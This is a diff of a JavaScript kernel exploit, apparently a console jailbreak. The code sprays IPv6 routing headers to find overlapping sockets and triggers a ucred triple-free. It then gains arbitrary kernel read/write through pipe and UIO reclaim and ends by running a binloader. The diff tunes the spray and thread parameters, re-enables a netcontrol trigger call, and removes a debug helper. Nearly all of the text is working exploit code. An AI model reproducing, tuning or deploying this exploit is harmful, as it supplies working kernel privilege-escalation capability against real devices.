@@ -68,8 +68,8 @@ var fcntl = fn.fcntl;
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper = syscalls.map.get(0x03);
 var write_wrapper = syscalls.map.get(0x04);
-var sched_yield_wrapper = syscalls.map.get(0x14b);
-var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
+var sched_yield_wrapper = syscalls.map.get(0x14B);
+var cpuset_setaffinity_wrapper = syscalls.map.get(0x1E8);
 var rtprio_thread_wrapper = syscalls.map.get(0x1D2);
 var recvmsg_wrapper = syscalls.map.get(0x1B);
 var readv_wrapper = syscalls.map.get(0x78);
@@ -110,15 +110,13 @@ var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
 var UCRED_SIZE = 0x168;
 var RTHDR_TAG = 0x13370000;
-var offset_map = {};
-var LOG_BUFFER = [];
 var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 64;
-var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 4;
+var IPV6_SOCK_NUM = 96;
+var IOV_THREAD_NUM = 8;
+var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
 var MAX_ROUNDS_TWIN = 10;
@@ -210,7 +208,7 @@ function build_rthdr(buf, size) {
 }
 function set_sockopt(sd, level, optname, optval, optlen) {
   var result = setsockopt(sd, level, optname, optval, optlen);
-  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+  if (result.eq(BigInt_Error)) {
     throw new Error('set_sockopt error: ' + hex(result));
   }
   return result;
@@ -239,26 +237,20 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   return read32(sockopt_len_ptr);
 }
 function set_rthdr(sd, buf, len) {
-  //log("[set_rthdr] sd=" + sd + " len=" + len);
-  var ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  //log("[set_rthdr] ret=" + ret);
-  return ret;
+  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
   // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
   // return ret;
 }
 function get_rthdr(sd, buf, max_len) {
-  //log("[get_rthdr] sd=" + sd + " max_len=" + max_len);
-  var ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-  //log("[get_rthdr] ret=" + ret);
-  return ret;
+  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
   // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
   // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
   // return ret;
 }
 function free_rthdrs(sds) {
   for (var sd of sds) {
-    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+    if (!sd.eq(BigInt_Error)) {
       set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
     }
   }
@@ -321,11 +313,11 @@ function create_workers() {
     iov_recvmsg_workers[i] = {
       rop: ret.rop,
       loop_size: ret.loop_size,
-      pipe_0: pipe_0,
-      pipe_1: pipe_1,
-      ready: ready,
-      done: done,
-      signal_buf: signal_buf
+      pipe_0,
+      pipe_1,
+      ready,
+      done,
+      signal_buf
     };
   }
 
@@ -531,7 +523,7 @@ function trigger_ipv6_spray_and_read() {
   write64(spray_ipv6_worker.done, 0);
 
   // Spawn ipv6_sockets spray and read worker
-  // Passing an stack addr reserved for each iteration
+  // Passing a stack address reserved for each iteration
   var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
   if (ret.eq(BigInt_Error)) {
     throw new Error('Could not spray_ipv6_worker');
@@ -768,81 +760,6 @@ function cleanup() {
   set_rtprio(prev_rtprio);
   log('Cleanup completed');
 }
-function monitor_header(sock, buf, maxLen, tag) {
-  // نفس شكل النداء القديم: الطول مباشرة
-  const ret = get_rthdr(sock, buf, maxLen);
-
-  log("[MON] ret = " + ret);
-
-  if (ret < 0) {
-    log("[MON] status = FAIL");
-    return { ok: false };
-  }
-
-  // اعتبر الطول الفعلي هو ret (لو بيرجع عدد البايتات المقروءة)
-  const actual_len = ret;
-  log("[MON] len = " + actual_len);
-
-  const hits = scan_for_tag(buf, actual_len, tag);
-
-  return {
-    ok: true,
-    len: actual_len,
-    hits
-  };
-}
-
-function scan_for_tag(buf, maxLen, tag) {
-  const hits = [];
-
-  for (let off = 0; off + 4 <= maxLen; off += 4) {
-    const val = read32(buf.add(off));
-
-    if ((val & 0xFFFF0000) === tag) {
-      hits.push({ off, val });
-    }
-  }
-
-  if (hits.length === 0) {
-    log("[MON] tag_found = false");
-  } else {
-    log("[MON] tag_found = true");
-    log("[MON] tag_hits = " + JSON.stringify(hits));
-  }
-
-  return hits;
-}
-
-function log(msg) {
-  send_notification(msg);
-}
-
-// خريطة تكرار الأوفستات
-var offset_map = {};
-
-// تحديث الخريطة
-function update_offset_map(hits) {
-    for (let h of hits) {
-        if (!offset_map[h.off]) offset_map[h.off] = 0;
-        offset_map[h.off]++;
-    }
-}
-
-// اختيار أفضل أوفست
-function get_best_offset() {
-    let best = -1;
-    let bestCount = -1;
-
-    for (let off in offset_map) {
-        if (offset_map[off] > bestCount) {
-            bestCount = offset_map[off];
-            best = parseInt(off);
-        }
-    }
-
-    return best; // ممكن يرجع -1 لو مفيش حاجة
-}
-
 function fill_buffer_64(buf, val, len) {
   if (!buf || buf.eq(0) || len <= 0) {
     return;
@@ -855,12 +772,19 @@ function find_twins() {
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
+
   twins[0] = -1;
   twins[1] = -1;
+
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
   while (count < MAX_ROUNDS_TWIN) {
-    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
+
+    if (typeof debugging !== 'undefined' &&
+        debugging.info && debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         cleanup();
@@ -869,87 +793,86 @@ function find_twins() {
     } else {
       zeroMemoryCount = 0;
     }
+
+    // رشّ الهيدر
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2 (memory barrier)
+      read32(spray_add);
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
+
+    // قراءة الهيدر
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(leak_add, 0);
+      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
-      // استخدم المونيتور بدل القراءة المباشرة
-      const mon = monitor_header(ipv6_socks[i], leak_rthdr, 64, RTHDR_TAG);
+      val = read32(leak_add);
+      j = val & 0xFFFF;
 
-      if (!mon.ok) continue;
-      if (mon.hits.length === 0) continue;
-
-      // حدّث خريطة الأوفستات
-      update_offset_map(mon.hits);
-
-      // اختار أفضل أوفست لحد دلوقتي
-      const best_off = get_best_offset();
-
-      // لو لسه مفيش أوفست ثابت، استخدم أول hit
-      const hit = (best_off === -1)
-        ? mon.hits[0]
-        : mon.hits.find(h => h.off === best_off) || mon.hits[0];
-
-      const j = hit.val & 0xFFFF;
-
-      if (i !== j && j >= 0 && j < ipv6_socks.length) {
+      // الشرط الجديد — الصح
+      if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log("TWINS : [" + i + "] [" + j + "]");
+        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
-
     }
 
     count++;
   }
+
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
-
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+
   var count = 0;
   var val, i, j;
+
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add = leak_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
   while (count < iterations) {
+
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2
+      read32(spray_add);
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-    write32(leak_add, 0); // تعديل رقم 4
+
+    write32(leak_add, 0);
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // تعديل رقم 3 (منع false positives)
+    // منع false positives
     if (j === master || j === other) {
       count++;
       continue;
     }
+
     if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
       return j;
     }
+
     count++;
   }
+
   return -1;
 }
+
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
@@ -1075,15 +998,15 @@ function setup_arbitrary_rw() {
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    throw new Error('Pipe leak1_fail');
+    throw new Error('Pipe_leak1_fail');
   }
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    throw new Error('Pipe leak2_fail');
+    throw new Error('Pipe_leak2_fail');
   }
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    throw new Error('pipe data_fail');
+    throw new Error('pipe_data_fail');
   }
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
@@ -1186,8 +1109,8 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  send_notification ('< Sobhan allh Wabe Hamdh Sobhan allh alazeem >');
-  send_notification ('[ Stability by DV M.ELHOUT ]');
+  send_notification('Subhan Allah wa biHamdih, Subhan Allah al-Azeem');
+  send_notification('[Stability by DV M. ELHOUT]');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1394,7 +1317,7 @@ function trigger_ucred_triplefree() {
     //send_notification("[STEP 1] alloc sock_buf + write fd: sock_buf=" + sock_buf + " fd=" + dummy_socket);
 
     //send_notification("[STEP 1] netcontrol register: cmd=" + hex(0x20000003) + " buf=" + sock_buf);
-   // netcontrol(-1, 0x20000003, sock_buf, 8);
+    netcontrol(-1, 0x20000003, sock_buf, 8);
 
     //send_notification("[STEP 1] close dummy_socket: fd=" + dummy_socket);
     close(new BigInt(dummy_socket));
@@ -1616,12 +1539,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 2000;
-var KWRITE_MAX_UIO_RECLAIM = 2000;
+var KREAD_MAX_UIO_RECLAIM = 1200;
+var KWRITE_MAX_UIO_RECLAIM = 1200;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 1200;
-var KWRITE_MAX_IOV_RECLAIM = 1200;
+var KREAD_MAX_IOV_RECLAIM = 500;
+var KWRITE_MAX_IOV_RECLAIM = 500;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 5;
@@ -1653,6 +1576,13 @@ function kreadslow(addr, size) {
       return BigInt_Error;
     }
   }
+  for (var _i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
+    write64(leak_buffers[_i3], LEAK_TAG);
+  }
+  write32(sockopt_val_buf, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+  write(new BigInt(uio_sock_1), tmp, size);
+  write64(uioIovRead.add(0x08), size);
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
